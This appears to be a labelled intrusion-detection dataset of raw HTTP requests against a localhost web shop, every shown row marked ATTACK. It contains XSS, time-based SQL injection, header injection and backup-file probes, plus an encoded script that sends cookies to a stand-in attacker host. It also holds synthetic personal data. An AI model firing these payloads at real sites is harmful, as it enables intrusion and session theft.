text,Label
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=16185616D4407646546E598375CC36F5
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 568

id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F",ATTACK
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=CE3D96596EFD14A11B8D8F7920DED28E
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 132

id=2bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&nombre=Vino+Rioja&precio=100&cantidad=21&B1=A%F1adir+al+carrito",ATTACK
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yank&password=tr4n52r&nombre=Ferreol&apellidos=Vilamitj%E0+Ponce&email=devlin_lazar%40joyaseleccion.tk&dni=93119033Z&direccion=Calle+Marques+De+Pontejos+170+&ciudad=Molar%2C+El&cp=44721bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&provincia=Badajoz&ntc=5418660256451813&B1=Registrar HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=B8870A601873D9062D4FC548453BA2A3
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/imagenes/2.gif/~ HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=889A2108EE18BF1297D39AD7E0BC7615
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=56A39361F6F8BE8DF140A1D387BD3C8C
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 57

errorMsg=Set-cookie%253A%2BTamper%253D1041264011025374727",ATTACK
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=markland&password=6os878rn8&nombre=Nolsaco&apellidos=Zarzalejo+Vendrell&email=coulson.koster%40lasiestacreativa.ph&dni=17456236H&direccion=Plza.+De+Los+Jardinillos+75%2C+&ciudad=Esguevillas+de+Esgueva&cp=34757&provincia=A+Coru%F1a&ntc=743503971711980&B1=Registrar HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=20AF204FCC7078977CA9B32A66266626
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.gif/.old HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=C4C3122343102DFB9C9F73025D5E15A3
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=clarita&password=2e720lOn7r%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccion=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=2BF0C897BAB9AB2B1A63EB7E7F69C517
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=9E949B29FF9A3F4388D7FC09E26A8BC9
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 22

B2=Vaciar+carrito%2520",ATTACK
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=01AF4061C3115E25D4218D38492F6122
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 61

modo=entrar&login=kimbra&pwdA=7g1j1T8RA&remember=on&B1=Entrar",ATTACK
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=B20A859FDCE07A33D0F0A034190F2F5B
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 253

modo=registro&login=deek&password=denunciadora&nombreA=Salina&apellidos=Gir%F3n+Cece%F1as&email=un-hi%40tarifasdevuelos.et&dni=55199080T&direccion=Tecla+Sala+74+&ciudad=Castrillo+de+Villavega&cp=18818&provincia=M%E1laga&ntc=7068244348344945&B1=Registrar",ATTACK
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=22ED8717134A09FDA70AF190FECCCF99
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 43

modo=insertar&precio=715&B1A=Pasar+por+caja",ATTACK
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=26E805B2AF43B9FF988A77D3574AB2CE
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 5

idA=2",ATTACK
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2500 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=BCD861133784EBAFD79A9749D71EDAB3
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/publico/autenticar.jsp.Inc HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=8201D7A979F2A3A1D2256452F16FB2C9
Connection: close",ATTACK
"GET http://localhost:8080~ HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=DE2D560CC1C0BC272FEB5127648EB32A
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=82BE6F073445EC32CE26E4208C8C059C
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 39

modo=insertar&precio=5022&B1A=Confirmar",ATTACK
"POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=3579797FB151725C104DF3A73816E331
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 5

idA=2",ATTACK
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=289B5BA21E0C13B64CF877DDD8885318
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 20

B2=%27INJECTED_PARAM",ATTACK
"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=EAB98FF12E9CB694E64AADA50B650171
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 34

errorMsgA=Credenciales+incorrectas",ATTACK
"GET http://localhost:8080/tienda1/global/creditos.jsp.INC HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=C4C1A886CD8976C88CB79C25E48FE94A
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=50E7E72BDD2BBDF800894C3CCE0016E2
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 130

modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=espesamente&remember=on&B1=Entrar",ATTACK
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=houdini&password=cabile%F1a&nombre=Yulisa&apellidos=Aup%ED+Feria&email=hee4%40ropadegolf.name&dni=77786356B&direccion=C%2F+Guatemala%2C+S%2FN%2C+6G&ciudad=J%E1vea%2FX%E0bia&cp=39790&provinciaA=Zaragoza&ntc=2661491792098457&B1=Registrar HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=B93A2B1373DD05D79765B4812DDA7815
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/global/creditos.jsp.BAK HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=EBC2A14B32DFD88BCDB9879FFF575093
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=2C4383DF8A5D0B018D1326736B645D2C
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 275

modo=registro&login=hannula&password=f0anh5eso&nombre=Josela&apellidos=Urzagaste+Galdon&email=cantinflas%40atrioregalos.bz&dni=06064345G&direccionA=C%2F+Batalla+De+Aina+190+6%3FA&ciudad=Sant+Fost+de+Campsentelles&cp=24359&provincia=Salamanca&ntc=6513561251939678&B1=Registrar",ATTACK
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=D2F01228447000A1BA66ECB3FA368020
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 263

modo=registro&login=jyoti&password=dechado&nombre=Tercero&apellidosA=Bori+Raich&email=varhelyi_krzyzewska%40santacruzdelvoto.mw&dni=87721362Y&direccion=Dulcinea%2C+158%2C+4%3FG&ciudad=Valverde+del+Camino&cp=19190&provincia=Cuenca&ntc=4412645005602081&B1=Registrar",ATTACK
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=B71A4CB4A6673F3FA589CEFEE2762DC6
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 226

modo=registro&login=cray&password=parenq35395028&nombre=Walda&apellidos=Bret&email=barwin%40smsg%40ay.je&dni=00602599E&direccion=Cuenca+S%2FN+&ciudad=Castro+del+R%EDo&cp=03679&provincia=Burgos&ntc=0570981782907546&B1=Registrar",ATTACK
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=6FA6B6798741F8D52F8095189F533728
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 244

modo=registro&login=virk&password=latrin5&nombre=Roxana&apellidosA=Barbero+Delgados&email=lutz%40ringringcargo.eg&dni=91059337Z&direccion=C%2F+Llucena%2C+193+2H&ciudad=Almu%F1%E9car&cp=43248&provincia=Barcelona&ntc=6935592091774249&B1=Registrar",ATTACK
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=FAAB70C1799947D8EE436617E5B608FF
Connection: close",ATTACK
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=crigger&pwdA=AcRIBaDora&remember=off&B1=Entrar HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=47EEE43BB084B4E792322CD83BFF7A26
Connection: close",ATTACK
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=4357296511696C60329A385992DCCA30
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 240

modo=registro&login=mayi&password=r75ar&nombre=Alenka&apellidos=Cejas+Torra&email=kobe%40techdata.com.pg&dni=75925253E&direccion=%27INJECTED_PARAM&ciudad=Torres+de+Cotillas%2C+Las&cp=08731&provincia=Navarra&ntc=1803474685764017&B1=Registrar",ATTACK
"GET http://localhost:8080/examplesWebApp/EJBeanManagedClient.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)
Pragma: no-cache
Cache-control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: x-gzip, x-deflate, gzip, deflate
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
Accept-Language: en
Host: localhost:8080
Cookie: JSESSIONID=2E0C5C1A6469A46A90098DCF75E0A9CE
Connection: close",ATTACK
